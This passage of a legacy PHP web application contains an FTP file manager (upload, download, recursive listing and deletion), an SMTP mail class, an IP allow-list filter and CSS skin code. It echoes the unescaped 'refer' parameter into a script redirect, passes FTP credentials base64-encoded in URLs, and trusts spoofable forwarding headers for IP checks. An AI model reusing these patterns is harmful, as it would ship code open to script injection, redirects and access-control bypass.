                //move_uploaded_file(trim(request("tmpname")), ini_get("user_dir")."\\ftptmp\\".basename(trim(request("filename"))));
                //echo is_uploaded_file($_FILES['filepath']['tmp_name'])?"t":"f";
                if (trim(request("binary")) == "1")
                        $upload = @ftp_put($conn_id, trim(request("dir"))."/".$_FILES['filepath']['name'], $_FILES['filepath']['tmp_name'], FTP_BINARY);
                        //$upload = @ftp_nb_put($conn_id, trim(request("dir"))."/".$_FILES['filepath']['name'], $_FILES['filepath']['tmp_name'], FTP_BINARY);
                else
                        $upload = @ftp_put($conn_id, trim(request("dir"))."/".$_FILES['filepath']['name'], $_FILES['filepath']['tmp_name'], FTP_ASCII);
                        //$upload = @ftp_nb_put($conn_id, trim(request("dir"))."/".$_FILES['filepath']['name'], $_FILES['filepath']['tmp_name'], FTP_ASCII);
        
                $timeout = "5000";
                if ($upload == true) {// check upload status
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                文件上传成功！共用时： <?php echo (time()-trim(request('timestamp')))/60;?> 分钟 <?php  echo $timeout/1000?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        echo "<p align=center><script>window.setTimeout(\"location.href=\'".trim(request("refer"))."\'\",".$timeout.");</script></p>"
                ?>
</table>                        
                <?php 
                }
                elseif($upload == false){// check upload status
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                文件上传失败！<?php  echo $timeout/1000?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        echo "<p align=center><script>window.setTimeout(\"location.href=\'".trim(request("refer"))."\'\",".$timeout.");</script></p>"
                ?>
</table>                        
                <?php 
                }       
                
                break;          
        case "ftp.download":
                Header("Content-type:application/octet-stream",false);
                $ch = curl_init();
                $url = "ftp://".base64_decode(trim(request("uname"))).":".base64_decode(trim(request("pwd")))."@".base64_decode(trim(request("server"))).trim(request("dir"))."/".trim(request("filename"));
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                $xmlstr = curl_exec($ch);
                curl_close($ch); 
                print_r($xmlstr);               
                break;          
        case "ftp.view":
                $serverport = trim(request("port"))==""?"21":trim(request("port"));
                if (trim(request("ssl")) == "1"){
                        $conn_id = ftp_ssl_connect(base64_decode(trim(request("server"))),$serverport);
                }
                else{
                        $conn_id = ftp_connect(base64_decode(trim(request("server"))),$serverport);
                }       
                $login_result = ftp_login($conn_id, base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))));                
                //@ftp_chdir($conn_id, "/");    
                $count = ftp_view($conn_id,((trim(request("dir"))=="/")?""."/":$dir."/").trim(request("dirname")),0,0);         
                if (((trim(request("dir"))=="/")?""."/":$dir."/").trim(request("dirname")) == arrmember(split("[|]",$count),"2")){
                        echo "目录:".arrmember(split("[|]",$count),"0").".文件:".arrmember(split("[|]",$count),"1")."\r\n";
                }
                break;          
        case "ftp.zip":
                break;          
        default:
								if ($_SESSION["ftp"]["server"] != "" && $_SESSION["ftp"]["uname"] != "" && $_SESSION["ftp"]["pwd"] != "" && trim(request("server")) == "" && trim(request("uname")) == "" && trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(base64_encode(trim($_SESSION["ftp"]["server"])))."&ssl=".encodeuri(trim($_SESSION["ftp"]["ssl"]))."&pasv=".encodeuri(trim($_SESSION["ftp"]["pasv"]))."&binary=".encodeuri(trim($_SESSION["ftp"]["binary"]))."&port=".encodeuri(trim($_SESSION["ftp"]["port"])).$skincolor."&dir=".encodeuri(trim($_SESSION["ftp"]["dir"]))."&uname=".encodeuri(base64_encode(trim($_SESSION["ftp"]["uname"])))."&pwd=".encodeuri(base64_encode(trim($_SESSION["ftp"]["pwd"])))."&action=".encodeuri("ftp.list")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }        
                ?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath()?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="40">
                <td align="center">
                        <form action="<?php echo ScriptPath()?>?api=ftp&skin=<?php echo $skincolor;?>&action=<?php echo encodeuri("ftp.list");?>&c=<?php echo encodeuri(trim(request("c")));?>&t=<?php echo encodeuri(trim(request("t")));?>&u=<?php echo encodeuri(trim(request("u")));?>" method="post" name="ftp">
                        &nbsp域名：<input type="text" class="text" name="server" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
                        &nbsp用户名：<input type="text" class="text" name="uname" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
                        &nbsp密码：<input type="password" class="text" name="pwd" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>> 
                        &nbsp端口：<input type="port" class="text" name="port" value="" style="height:20px;width:4%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>> 
                        SSL：<input type="checkbox" id="ssl" name="ssl" value="1" />
                        被动：<input type="checkbox" id="pasv" name="pasv" value="1" />
                        &nbsp验证码：<input <?php echo $style->input("#FCFC9D","") ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>
        </tr>   
</table>
<?php                       
                                
                } //action switch end
                $style->footer();
                //exit;                   
}

function ftp_view($conn_id,$dir,$dircount,$filecount){
        $contents = ftp_rawlist($conn_id, $dir);
        if (ftp_systype($conn_id) == "Windows_NT"){
                foreach ($contents as $current){ 
                        ereg("([0-9]{2})-([0-9]{2})-([0-9]{2}) +([0-9]{2}):([0-9]{2})(AM|PM) +([0-9]+|<DIR>) +(.+)",$current,$split);
                        if ($split[7] == "<DIR>"){
                                echo ($dir=="/")?"":$dir;
                                echo "/".$split[8]."\r\n"; 
                                $dircount = $dircount + 1;                              
                                $count = ftp_view($conn_id,$dir."/".$split[8],$dircount,$filecount);
                                $dircount = (int)arrmember(split("[|]",$count),"0");
                                $filecount = (int)arrmember(split("[|]",$count),"1");
                        }
                        else{
                                $filecount = $filecount + 1;                            
                                echo ($dir=="/")?"":$dir;
                                echo "/".$split[8]."\r\n"; 
                        }
                }       
        }
        //echo "目录：".$dircount."文件".$filecount."\r\n";             
        return $dircount."|".$filecount."|".$dir;               
}

function ftp_deldir($conn_id,$dir){
        $contents = ftp_rawlist($conn_id, $dir);
        $msg = "wait";
        $systype = ftp_systype($conn_id);
        if(count($contents) != '0'){    
                foreach ($contents as $current){ 
                        if ($systype == "Windows_NT"){
                                ereg("([0-9]{2})-([0-9]{2})-([0-9]{2}) +([0-9]{2}):([0-9]{2})(AM|PM) +([0-9]+|<DIR>) +(.+)",$current,$split);
                                if ($split[7]=="<DIR>"){
                                        if ($split[8] == "." || $split[8] == ".."){
                                        }
                                        else{                           
                                                ftp_chmod($conn_id, 0777, $dir.'/'.$split[8]);
                                                $msg = ftp_deldir($conn_id,$dir.'/'.$split[8]);
                                        }
                                }
                                else{   
                                        if ($split[8] == "." || $split[8] == ".."){
                                        }
                                        else{                                   
                                                ftp_chmod($conn_id, 0777, $dir.'/'.$split[8]);                          
                                                $msg = @ftp_delete($conn_id,$dir.'/'.$split[8]);
                                        }       
                                }
                                if ($msg == true || $msg == "wait"){
                                        unset($current);
                                        unset($split);
                                }
                                elseif ($msg == false){
                                        unset($current);
                                        unset($split);
                                        return false;
                                }
                        }
                        elseif ($systype == "UNIX"){
                                ereg("([^ ]+) +([^ ]+) +([^ ]+) +([^ ]+) +([0-9]+) ([^ ]+ +[0-9]{1,2} +)([0-9]{1,2}[:][0-9]{1,2}|[0-9]+) +(.+)",$current,$split);
                                if (substr($split[1],0,1)=="d"){
                                        if ($split[8] == "." || $split[8] == ".."){
                                        }
                                        else{                                   
                                                ftp_chmod($conn_id, 0777, $dir.'/'.$split[8]);                          
                                                $msg = ftp_deldir($conn_id,$dir.'/'.$split[8]);
                                        }       
                                }       
                                else{
                                        if ($split[8] == "." || $split[8] == ".."){
                                        }
                                        else{                                   
                                                ftp_chmod($conn_id, 0777, $dir.'/'.$split[8]);                          
                                                $msg = @ftp_delete($conn_id,$dir.'/'.$split[8]);
                                        }       
                                }       
                                if ($msg == true || $msg == "wait"){
                                        unset($current);
                                        unset($split);
                                }
                                else{
                                        unset($current);
                                        unset($split);
                                        return false;
                                }
                        }
                }
        }
        ftp_chmod($conn_id, 0777, $dir);        
        return @ftp_rmdir($conn_id,$dir);
}
?>

<?php  class smtp 
{
        
/* Public Variables */ 
var $smtp_port; 
var $time_out; 
var $host_name; 
var $log_file; 
var $relay_host; 
var $debug; 
var $auth; 
var $user; 
var $pass; 
var $timeout;
var $charset;

/* Private Variables */ 
var $sock; 

/* Constractor */ 
function smtp($relay_host = "", $smtp_port = 25,$auth = false,$user,$pass,$timeout=30) 
{ 
        $this->debug = FALSE; 
        $this->smtp_port = $smtp_port; 
        $this->relay_host = $relay_host; 
        $this->time_out = $timeout; 
        //is used in fsockopen() # 
        $this->auth = $auth;//auth 
        $this->user = $user; 
        $this->pass = $pass; 
        $this->host_name = "localhost"; 
        //is used in HELO command 
        $this->log_file = ""; 
        $this->sock = FALSE; 
        $this->charset = "utf-8"; 
} 
/* 
Main Function 
*/ 
function sendmail($to,$toname, $from,$fromname, $subject = "", $body = "", $mailtype="html", $cc = "", $bcc = "", $additional_headers = "") 
{
        date_default_timezone_set('UTC');
        $mail_from = $this->get_address($this->strip_comment($from)); 
        $body = ereg_replace("(^|(\r\n))(\.)", ".", $body); 
        $header  = '';
        $header .= "MIME-Version:1.0\r\n"; 
        if($mailtype=="html")
        {
                 $header .= "Content-Type:text/html\r\n"; 
        }
        else
        {
                 $header .= "Content-Type:text/plain\r\n"; 
        }        
        $header .= "To: $toname<".$to.">\r\n"; 
        //$header .= "To: =?$this->charset?B?".base64_encode($to_name)."?=<$to_mail>\r\n"
        if ($cc != "") 
        { 
                $header .= "Cc: ".$cc."\r\n"; 
        } 
        $header .= "From: $fromname<".$from.">\r\n"; 
        //$header .= "From: =?$this->charset?B?".base64_encode($from)."?=<$from>\r\n"
        $header .= "Subject: ".$subject."\r\n"; 
        $header .= $additional_headers; 
        $header .= "Date: ".date("r",time()+3600*8)."\r\n"; 
        $header .= "X-Mailer:By Redhat (PHP/".phpversion().")\r\n"; 
        list($msec, $sec) = explode(" ", microtime()); 
        $header .= "Message-ID: <".date("YmdHis", $sec+3600*8).".".($msec*1000000).".".$mail_from.">\r\n"; 

        $TO = explode(",", $this->strip_comment($to)); 
        if ($cc != "") 
        { 
                $TO = array_merge($TO, explode(",", $this->strip_comment($cc))); 
        } 
        if ($bcc != "") 
        { 
                $TO = array_merge($TO, explode(",", $this->strip_comment($bcc))); 
        } 
        $sent = TRUE; 
        foreach ($TO as $rcpt_to) 
        { 
                $rcpt_to = $this->get_address($rcpt_to); 
                if (!$this->smtp_sockopen($rcpt_to)) 
                { 
                        $this->log_write("Error: Cannot send email to ".$rcpt_to."\n"); 
                        $sent = FALSE; continue; 
                } 
                if ($this->smtp_send($this->host_name, $mail_from, $rcpt_to, $header, $body)) 
                { 
                        $this->log_write("E-mail has been sent to <".$rcpt_to.">\n"); 
                } 
                else 
                { 
                        $this->log_write("Error: Cannot send email to <".$rcpt_to.">\n"); 
                        $sent = FALSE; 
                } 
                fclose($this->sock); 
                $this->log_write("Disconnected from remote host\n"); 
        } 
        return $sent; 
} 
/* 
Private Functions 
*/ 
function smtp_send($helo, $from, $to, $header, $body = "") 
{
        if (!$this->smtp_putcmd("HELO", $helo)) 
        { 
                return $this->smtp_error("sending HELO command"); 
        } 
        #auth 
        if($this->auth)
        { 
                if (!$this->smtp_putcmd("AUTH LOGIN", base64_encode($this->user))) 
                { 
                        return $this->smtp_error("sending HELO command"); 
                } 
                if (!$this->smtp_putcmd("", base64_encode($this->pass))) 
                { 
                        return $this->smtp_error("sending HELO command"); 
                } 
        } 
        # 
        if (!$this->smtp_putcmd("MAIL", "FROM:<".$from.">")) 
        { 
                return $this->smtp_error("sending MAIL FROM command"); 
        } 
        if (!$this->smtp_putcmd("RCPT", "TO:<".$to.">")) 
        { 
                return $this->smtp_error("sending RCPT TO command"); 
        } 
        if (!$this->smtp_putcmd("DATA")) 
        { 
                return $this->smtp_error("sending DATA command"); 
        } 
        if (!$this->smtp_message($header, $body)) 
        { 
                return $this->smtp_error("sending message"); 
        } 
        if (!$this->smtp_eom()) 
        { 
                return $this->smtp_error("sending <CR><LF>.<CR><LF> [EOM]"); 
        } 
        if (!$this->smtp_putcmd("QUIT")) 
        { 
                return $this->smtp_error("sending QUIT command"); 
        } 
        
        return TRUE; 
} 

function smtp_sockopen($address) 
{ 
        if ($this->relay_host == "") 
        {
                return $this->smtp_sockopen_mx($address); 
        } 
        else 
        { 
                return $this->smtp_sockopen_relay(); 
        } 
} 

function smtp_sockopen_relay() 
{
        $this->log_write("<br>Trying to ".$this->relay_host.":".$this->smtp_port."<br>"); 
        $this->sock = @fsockopen($this->relay_host, $this->smtp_port, $errno, $errstr, $this->time_out); 
        if (!($this->sock && $this->smtp_ok())) 
        { 
                $this->log_write("Error: Cannot connenct to relay host ".$this->relay_host."<br>"); 
                $this->log_write("Error: ".$errstr." (".$errno.")<br>"); 
                return FALSE; 
        } 
        $this->log_write("Connected to relay host ".$this->relay_host."\n"); 
        return TRUE;
} 

function smtp_sockopen_mx($address) 
{ 
        $domain = ereg_replace("^.+@([^@]+)$", "", $address); 
        if (!@getmxrr($domain, $MXHOSTS)) 
        { 
                $this->log_write("Error: Cannot resolve MX \"".$domain."\"<br>"); 
                return FALSE; 
        } 
        foreach ($MXHOSTS as $host) 
        { 
                $this->log_write("Trying to ".$host.":".$this->smtp_port."<br>"); 
                $this->sock = @fsockopen($host, $this->smtp_port, $errno, $errstr, $this->time_out); 
                if (!($this->sock && $this->smtp_ok())) 
                { 
                        $this->log_write("Warning: Cannot connect to mx host ".$host."\n"); 
                        $this->log_write("Error: ".$errstr." (".$errno.")<br>"); 
                        continue; 
                } 
                $this->log_write("Connected to mx host ".$host."\n"); 
                return TRUE; 
        } 
        $this->log_write("Error: Cannot connect to any mx hosts (".implode(", ", $MXHOSTS).")\n"); 
        return FALSE; 
} 

function smtp_message($header, $body) 
{ 
        fputs($this->sock, $header."\r\n".$body); 
        $this->smtp_debug("> ".str_replace("\r\n", "\n"."> ", $header."\n> ".$body."\n> ")); 
        return TRUE; 
} 

function smtp_eom() 
{ 
        fputs($this->sock, "\r\n.\r\n"); 
        $this->smtp_debug(". [EOM]\n"); 
        return $this->smtp_ok(); 
} 

function smtp_ok() 
{ 
        $response = str_replace("\r\n", "", fgets($this->sock, 512)); 
        $this->smtp_debug($response."\n"); 
        if (!ereg("^[23]", $response)) 
        { 
                fputs($this->sock, "QUIT\r\n"); 
                fgets($this->sock, 512); 
                $this->log_write("Error: Remote host returned \"".$response."\"\n"); 
                return FALSE; 
        } 
        return TRUE; 
} 

function smtp_putcmd($cmd, $arg = "") 
{ 
        if ($arg != "") 
        { 
                if($cmd=="") $cmd = $arg; else $cmd = $cmd." ".$arg; 
        } 
        fputs($this->sock, $cmd."\r\n"); 
        $this->smtp_debug("> ".$cmd."\n"); 
        return $this->smtp_ok(); 
} 

function smtp_error($string) 
{ 
        $this->log_write("Error: Error occurred while ".$string.".\n");
        return FALSE; 
} 

function log_write($message) 
{ 
        $this->smtp_debug($message); 
        if ($this->log_file == "") 
        { 
                return TRUE; 
        } 
        $message = date("M d H:i:s ",time()+3600*8).get_current_user()."[".getmypid()."]: ".$message; 
        if (!@file_exists($this->log_file) || !($fp = @fopen($this->log_file, "a"))) 
        { 
                $this->smtp_debug("Warning: Cannot open log file \"".$this->log_file."\"\n"); 
                return FALSE;
        } 
        flock($fp, LOCK_EX); 
        fputs($fp, $message); 
        fclose($fp); return TRUE; 
} 

function strip_comment($address) 
{ 
        $comment = "\([^()]*\)"; 
        while (ereg($comment, $address)) 
        { 
                $address = ereg_replace($comment, "", $address); 
        } 
        return $address; 
} 

function get_address($address) 
{ 
        $address = ereg_replace("([ \t\r\n])+", "", $address); 
        $address = ereg_replace("^.*<(.+)>.*$", "", $address); 
        return $address; 
} 

function smtp_debug($message) 
{ 
        if ($this->debug) 
        { 
                echo $message; 
        } 
} 

} 

?> 

<?php 
class IPFilter
{
        function IPFilter($ipstr) {
                $this->ipstr = $ipstr;
        }
        
        function IPlimiter() {
				$ipallow = ""; 
      
               return $ipallow;
        }

function get_real_ip()
{
$ip=false;
if(!empty($_SERVER["HTTP_CLIENT_IP"])){
  $ip = $_SERVER["HTTP_CLIENT_IP"];
}
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
  $ips = explode (", ", $_SERVER['HTTP_X_FORWARDED_FOR']);
  if($ip){
   array_unshift($ips, $ip); $ip = FALSE;
  }
  for($i = 0; $i < count($ips); $i++){
   if (!eregi ("^(10|172\.16|192\.168)\.", $ips[$i])){
    $ip = $ips[$i];
    break;
   }
  }
}
return($ip ? $ip : $_SERVER['REMOTE_ADDR']);
}
       
        function CheckIP() {
        //print_r($_SERVER);
                //if (trim($_SERVER['REMOTE_ADDR']) != ''){
                //        $ip = trim($_SERVER['REMOTE_ADDR']);
                //}
                //elseif (stripos($_SERVER['HTTP_X_FORWARDED_FOR'],',') !== false){
                //        $ip = substr(trim($_SERVER['HTTP_X_FORWARDED_FOR']),0,stripos($_SERVER['HTTP_X_FORWARDED_FOR'], ','));
                //}
                //elseif (stripos($_SERVER['HTTP_X_FORWARDED_FOR'],';') !== false){
                //        $ip = substr(trim($_SERVER['HTTP_X_FORWARDED_FOR']),0,stripos($_SERVER['HTTP_X_FORWARDED_FOR'], ';'));
                //}
                //else{
                //        $ip = trim($_SERVER['HTTP_X_FORWARDED_FOR']);
                //}

                $ip = $this->get_real_ip();
                
                if (stripos($this->ipstr,'|') != '0' )
                	$iparray = split('[|]',$this->ipstr);
                else
                	$iparray['0'] = $this->ipstr;
                $flag = '0';
                for ($i = 0; $i < count($iparray); $i++) {
                        if ($iparray[$i] == $ip || $iparray[$i] == $servername){
                                $flag = '1';
                        }
                        elseif ((count(split('[.]',$iparray[$i])) < 4)||(strripos($iparray[$i],'.') == (strlen($iparray[$i])-1))){
                                if (strripos($ip,$iparray[$i]) === 0){
                                        $flag = '1';
                                }
                        }
                        elseif (stripos($iparray[$i],'<>') != '0' ){
                                $tellipstr = split('<>',$iparray[$i]);
                                if ((max($this->ip2num($tellipstr[0]),$this->ip2num($tellipstr[1]),$this->ip2num($ip)) > $this->ip2num($ip)) && (min($this->ip2num($tellipstr[0]),$this->ip2num($tellipstr[1]),$this->ip2num($ip)) < $this->ip2num($ip))){
                                        $flag = '1';
                                }
                        }
                        if ($flag == '1'){
                                return array('ok',$iparray[$i]); 
                        }
                        elseif ($flag == '0'){
                        }
                }
                return array('',$ip);
        }
    
        function ip2num($ipstring){
                $ipstr = split("[.]", $ipstring); 
                for ($v = 0 ; $v < count($ipstr) ; $v++){
                        if (strlen($ipstr[$v]) < 3){
                                if (strlen($ipstr[$v]) == '1'){
                                        $ipstr[$v] = "00" . $ipstr[$v];
                                }       
                                elseif (strlen($ipstr[$v]) == '2'){
                                        $ipstr[$v] = "0" . $ipstr[$v];
                                }       
                        }
                }
                return ($ipstr[0].'.'.$ipstr[1].'.'.$ipstr[2].'.'.$ipstr[3]);   
        }
}

class css{

function css(){
}

function skincolorarray($skin){
    $skincolor["red"]=array("tdtbg"=>"#FFDDDD","tdbg"=>"#FFEEEE","others"=>"#FFDDDD");
    $skincolor["gold"]=array("tdtbg"=>"#FAEFC0","tdbg"=>"#FDF7DF","others"=>"#FAEFC0");
    $skincolor["blue"]=array("tdtbg"=>"#CCE0FF","tdbg"=>"#DEEBFE","others"=>"#CCE0FF");
    $skincolor["purple"]=array("tdtbg"=>"#F5D6F5","tdbg"=>"#F8E4F8","others"=>"#F5D6F5");
    $skincolor["black"]=array("tdtbg"=>"#DDDDDD","tdbg"=>"#EEEEEE","others"=>"#DDDDDD");
    $skincolor["green"]=array("tdtbg"=>"#CBEFCB","tdbg"=>"#E5F7E5","others"=>"#CBEFCB"); 
    return $skincolor[$skin];
}

function selcss($skincolor){
$skincolorarray=$this->skincolorarray($skincolor);
	//return;
/*
CSS gradient渐变之webkit
-webkit-gradient(type, start_point, end_point, / stop...)
-webkit-gradient(type, inner_center, inner_radius, outer_center, outer_radius, / stop...)

参数类型	简要说明
type	渐变的类型，可以是线性渐变(linear)或是径向渐变(radial)
start_point	渐变图像中渐变的起始点
end_point	渐变图像中渐变的结束点
stop	color-stop()方法，指定渐变进程中特定的颜色
inner_center	内部中心点，径向渐变起始圆环
inner_radius	内部半径，径向渐变起始圆
outer_center	外部渐变结束圆的中心点
outer_radius	外部渐变结束圆的半径

IE浏览器下渐变背景的使用需要使用IE的渐变滤镜。如下代码：
filter: progid:DXImageTransform.Microsoft.gradient(startcolorstr=red,endcolorstr=blue,gradientType=1);

上面的滤镜代码主要有三个参数，依次是：startcolorstr, endcolorstr, 以及gradientType。
其中gradientType=1代表横向渐变，gradientType=0代表纵向淅变。startcolorstr=”色彩” 代表渐变渐变起始的色彩，endcolorstr=”色彩” 代表渐变结尾的色彩。
*/
	//return;
?>
<style>
	      td { font-size: 12px; align:center;valign:middle;} 
        .tdtbg {align:center;valign:middle;background-color: <?php  echo $skincolorarray["tdtbg"]; ?>; color:#444444;}
        .tdbg {align:center;valign:middle;background-color: <?php  echo $skincolorarray["tdbg"]; ?>;  color:#444444;}
        .sotoolbar {border: 3px solid <?php  echo $skincolorarray["tdtbg"]; ?>;border-bottom:3px solid <?php  echo $skincolorarray["tdtbg"]; ?>;}
        .sotoolbar button{border: 3px solid <?php  echo $skincolorarray["tdtbg"]; ?>;border-bottom:3px solid <?php  echo $skincolorarray["tdtbg"]; ?>;}     
        .sotoolbar select{border: 3px solid <?php  echo $skincolorarray["tdtbg"]; ?>;border-bottom:3px solid <?php  echo $skincolorarray["tdtbg"]; ?>;}                
        .sotoolbar select { font-size:12px; color: #444444; background-color: #ffffff; border-left:1px <?php  echo $skincolorarray["tdtbg"] ?> solid;border-top:1px <?php  echo $skincolorarray["tdtbg"] ?> solid;border-right:1px <?php  echo $skincolorarray["tdtbg"] ?> solid;border-bottom:1px <?php  echo $skincolorarray["tdtbg"] ?> solid;}             	
				input.text { font-size:12px; color: #444444; background-color: #ffffff; border: 0px solid <?php echo $skincolorarray["tdtbg"] ?> ; }
        select.text { font-size:12px; color: #444444;background-color: <?php  echo $skincolorarray["others"] ?>; border: 1px <?php  echo $skincolorarray["others"] ?> solid;} 
        textarea.text { font-size:12px; color: #444444; background-color: #ffffff; border: 1px solid <?php  echo $skincolorarray["others"] ?>; } 
        .option { font-size:12px; color: #444444; background-color: <?php echo $skincolorarray["tdtbg"] ?>; border: 1px solid <?php  echo $skincolorarray["others"] ?>;} 
        .button{font-family: "Tahoma", "宋体"; font-size: 11px; color: #444444;border: 1px <?php  echo $skincolorarray["others"]; ?> solid; background-color: <?php  echo $skincolorarray["tdtbg"]; ?>;CURSOR: hand;font-style: normal ;}
        .input { font-size:12px; color: #444444; background-color: #ffffff; border-left:1px <?php  echo $skincolorarray["tdtbg"]; ?> solid;border-top:1px <?php  echo $skincolorarray["tdtbg"]; ?> solid;border-right:1px <?php  echo $skincolorarray["tdtbg"]; ?> solid;border-bottom:1px <?php  echo $skincolorarray["tdtbg"]; ?> solid;text-align:center; }
        .textarea { font-size:12px; color: #444444; background-color: #ffffff; border-left:1px <?php  echo $skincolorarray["tdtbg"]; ?> solid;border-top:1px <?php  echo $skincolorarray["tdtbg"]; ?> solid;border-right:1px <?php  echo $skincolorarray["tdtbg"]; ?> solid;border-bottom:1px <?php  echo $skincolorarray["tdtbg"]; ?> solid;}        
        .select { font-size:12px; color: #444444; background-color: #ffffff;border:1px <?php  echo $skincolorarray["tdtbg"]; ?> solid; border-left:1px <?php  echo $skincolorarray["tdtbg"]; ?> solid;border-top:1px <?php  echo $skincolorarray["tdtbg"]; ?> solid;border-right:1px <?php  echo $skincolorarray["tdtbg"]; ?> solid;border-bottom:1px <?php  echo $skincolorarray["tdtbg"]; ?> solid;}       	
        .title { font-size: 12px; font-family: ; color: #000; } 
        .tborder { BORDER: <?php  echo $skincolorarray["others"]; ?> 1px solid; } 
        .tgborder { BORDER: <?php  echo $skincolorarray["tdbg"]; ?> 1px solid;cursor:pointer }  
        A:link { color:#444444; text-decoration:none; } 
        A:visited { color:#444444; text-decoration:none; } 
        A:hover { color:#ff0000; text-decoration:none; } 
        A.hotexamA:link { color:#444444; text-decoration:none; } 
        A.hotexamA:visited { color:#444444; text-decoration:none; } 
        A.hotexamA:hover { color:#ff0000; text-decoration:none; } 
        body {background-color: #ffffff;color:#444444;scrollbar-base-color:<?php echo $skincolorarray["tdtbg"]; ?>;} 
        
 ::-webkit-scrollbar-track-piece{ 
            background-color:<?php echo $skincolorarray["tdbg"]; ?>; 
            -webkit-border-radius:3; 
        } 
 ::-webkit-scrollbar-track-piece:hover{ 
            background-color:<?php echo $skincolorarray["tdtbg"]; ?>; 
            -webkit-border-radius:3; 
        }        
        ::-webkit-scrollbar{ 
            width:15px; 
            height:8px; 
        } 
        ::-webkit-scrollbar-thumb{ 
            height:30px; 
            background-color:#ffffff; 
            -webkit-border-radius:7px; 
            outline:2px solid <?php echo $skincolorarray["tdbg"]; ?>; 
            outline-offset:-2px; 
            border: 2px solid <?php echo $skincolorarray["tdbg"]; ?>; 
        } 
        ::-webkit-scrollbar-thumb:hover{ 
            height:30px; 
            background-color:#f9f9f9; 
            -webkit-border-radius:8px; 
            outline:2px solid <?php echo $skincolorarray["tdtbg"]; ?>; 
            outline-offset:-2px; 
            border: 2px solid <?php echo $skincolorarray["tdtbg"]; ?>;             
        } 
        
        ul {margin:0px; padding:0px; width:100px; height:200px; overflow-x:hidden; overflow-y:auto;}        
</style>
<?php       
}
        
function ico(){
if(!file_exists('./X3193.ico')){
        if (icon()=='ok'){
                ?><link rel="Bookmark" href="<?php  echo httppathdir() ?>X3193.ico">
                <link rel="Shortcut Icon" href="<?php  echo httppathdir() ?>X3193.ico">
                <?php 
        }
}
else{
        ?><link rel="Bookmark" href="<?php  echo httppathdir() ?>X3193.ico">
        <link rel="Shortcut Icon" href="<?php  echo httppathdir() ?>X3193.ico">
        <?php 
}
?>
<meta name="google-translate-customization" content="3bc603e5906b155a-27172a03263b5606-g1066c753d40349bf-9"></meta>
<?php 

}

function title($titlestr){
?>
<title><?php  echo $titlestr; ?></title>
<?php 
}

function configrequest($fullurl,$requeststr,$requestvalue){
if (stripos($fullurl,$requeststr."=") == true){
        if (stripos($fullurl,"&",stripos($fullurl,$requeststr."=")) == true){
                echo str_replace(substr($fullurl,stripos($fullurl,$requeststr."="),(stripos($fullurl,"&",stripos($fullurl,$requeststr."="))-stripos($fullurl,$requeststr."="))),$requeststr."=".$requestvalue,$fullurl);
                //echo '1';
        }       
        elseif (stripos($fullurl,"&",stripos($fullurl,$requeststr."=")) == FALSE){
                echo str_replace(substr($fullurl,stripos($fullurl,$requeststr."=")),$requeststr."=".$requestvalue,$fullurl);
                //echo '2';
        }       
}       
elseif (stripos($fullurl,"=") == FALSE){
        echo $fullurl.$requeststr."=".$requestvalue;
        //echo '3';
}       
elseif (stripos($fullurl,$requeststr."=") == FALSE){
        echo $fullurl."&".$requeststr."=".$requestvalue;
        //echo '4';
        
}
else
        echo '5';
        
}

function input($mouseoverbgcolor,$mouseoutbgcolor,$id=''){
	if($id!=''){
?>onmouseover="javascript:o<?php  echo $id ;?>=document.getElementById('<?php  echo $id ;?>').value;this.style.backgroundColor='#f9f9f9';" onmouseout="this.style.backgroundColor='';" onmousedown="javascript:if(document.getElementById('<?php  echo $id ;?>').value==o<?php  echo $id ;?>)document.getElementById('<?php  echo $id ;?>').value='';document.getElementById('<?php  echo $id ;?>').onmouseover='';this.style.backgroundColor='#f9f9f9';" onBlur="javascript:if(document.getElementById('<?php  echo $id ;?>').value=='')document.getElementById('<?php  echo $id ;?>').value=o<?php  echo $id ;?>;this.style.backgroundColor='';"<?php 
}elseif($id==''){
?>
onmouseover="this.style.backgroundColor='<?php  echo $mouseoverbgcolor ;?>';" onmouseout="this.style.backgroundColor='<?php  echo $mouseoutbgcolor; ?>';" onmousedown="this.style.backgroundColor='<?php echo $mouseoverbgcolor;?>';"
<?php	
	}
}

function textarea($mouseoverbgcolor,$mouseoutbgcolor,$id=''){
	if($id!=''){
?>onmouseover="javascript:o<?php  echo $id ;?>=<?php  echo $id ;?>.value;this.style.backgroundColor='#f9f9f9';" onmouseout="this.style.backgroundColor='';" onmousedown="javascript:if(<?php  echo $id ;?>.value==o<?php  echo $id ;?>)<?php  echo $id ;?>.value='';document.getElementById('<?php  echo $id ;?>').onmouseover='';this.style.backgroundColor='#f9f9f9';" onBlur="javascript:if(<?php  echo $id ;?>.value=='')<?php  echo $id ;?>.value=o<?php  echo $id ;?>;this.style.backgroundColor='';"<?php 
}elseif($id==''){
?>
